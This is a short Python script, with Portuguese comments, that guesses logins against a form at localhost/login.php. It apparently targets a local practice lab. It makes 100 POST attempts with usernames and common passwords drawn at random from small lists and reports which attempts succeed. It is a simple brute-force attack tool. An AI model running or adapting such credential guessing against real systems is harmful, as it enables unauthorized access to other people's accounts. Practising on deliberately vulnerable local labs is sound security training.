import requests
import random
import string

# URL da página de login
login_url = 'http://localhost/login.php'

# Lista de usuários e senhas aleatórias
users = ['user1', 'user2', 'user3']
passwords = ['pass123', 'password', '123456']

# Número de tentativas de login
num_attempts = 100

# Realiza tentativas de login
for _ in range(num_attempts):
    # Gera um usuário e senha aleatórios
    username = random.choice(users)
    password = random.choice(passwords)

    # Cria os dados do formulário de login
    data = {
        'username': username,
        'password': password,
        'Login': 'Submit'
    }

    # Envia a solicitação POST para o formulário de login
    response = requests.post(login_url, data=data)

    # Verifica se o login foi bem-sucedido
    if 'Login failed' not in response.text:
        print(f'Successful login: {username}/{password}')
    else:
        print(f'Failed login: {username}/{password}')

